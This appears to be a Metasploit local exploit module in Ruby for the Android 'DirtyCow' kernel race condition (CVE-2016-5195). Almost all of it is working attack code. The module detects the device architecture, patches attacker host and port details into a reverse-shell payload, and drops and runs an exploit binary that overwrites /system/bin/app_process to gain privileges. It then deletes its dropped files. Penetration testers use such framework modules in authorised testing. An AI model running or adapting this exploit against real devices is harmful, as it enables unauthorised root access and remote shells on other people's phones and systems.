##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Common
  include Msf::Exploit::EXE

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "Android DirtyCow Exploit",
        'Description'   => %q{
          A race condition was found in the way the Linux kernel's memory
          subsystem handled the copy-on-write (COW) breakage of private
          read-only memory mappings. An unprivileged local user could use
          this flaw to gain write access to otherwise read-only memory mappings
          and thus increase their privileges on the system.
          The bug has existed since around Linux Kernel 2.6.22 (released in 2007).
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
          'Phil Oester',  # discovery
          'scumjr',       # dirtycow-mem.c
          'timwr',        # metasploit module
        ],
        'References'    =>
        [
          [ 'CVE', '2016-5195' ],
          [ 'URL', 'http://dirtycow.ninja/' ],
          [ 'URL', 'https://gist.github.com/scumjr/17d91f20f73157c722ba2aea702985d2' ],
        ],
        'DisclosureDate' => "Oct 20 2016",
        'SessionTypes'   => [ 'meterpreter' ],
        "Platform"       => [ "android", "linux" ],
        "Arch"           => ARCH_ARMLE,
        'DefaultOptions' =>
        {
          'PAYLOAD'      => 'generic/shell_reverse_tcp',
          'WfsDelay'     => 120,
        },
        'DefaultTarget' => 0,
        'Targets'       => [ ['Automatic', { }]],
    }))
    register_options([
      OptString.new('BINARY_TO_OVERWRITE', [ true, 'The remote file that will be overwritten.', '/system/bin/app_process']),
    ], self.class)
  end

  def exploit
    arch = cmd_exec("getprop ro.product.cpu.abi")
    if arch
      print_good("Exploiting architecture #{arch}")
    else
      print_bad("Could not detect architecture")
      return
    end

    local_file = File.join( Msf::Config.data_directory, "exploits", "CVE-2016-5195", arch, "dirtycow" )
    payload_file = File.join( Msf::Config.data_directory, "exploits", "CVE-2016-5195", arch, "payload" )
    exploit_data = File.read(local_file, {:mode => 'rb'})
    payload_data = File.read(payload_file, {:mode => 'rb'})

    payload_str = [ datastore['LPORT'], datastore['LHOST'] ].pack("Sa*")
    payload_data.gsub!("LHOST_PLACEHOLDE" + "\x00" * 239, payload_str + "\x00" * (255 - payload_str.size))

    workingdir = session.fs.dir.getwd
    exploit_file = "#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}"
    overwrite_file = "#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}"
    write_file(exploit_file, exploit_data)
    write_file(overwrite_file, payload_data)

    cmd_exec("chmod 700 #{exploit_file}")
    #cmd_exec("chmod 700 #{overwrite_file}")
    #output = cmd_exec("#{overwrite_file} #{datastore['BINARY_TO_OVERWRITE']}")
    output = cmd_exec("#{exploit_file} #{overwrite_file} #{datastore['BINARY_TO_OVERWRITE']}")
    print_status output

    session.fs.file.rm(exploit_file)
    session.fs.file.rm(overwrite_file)

  end

end

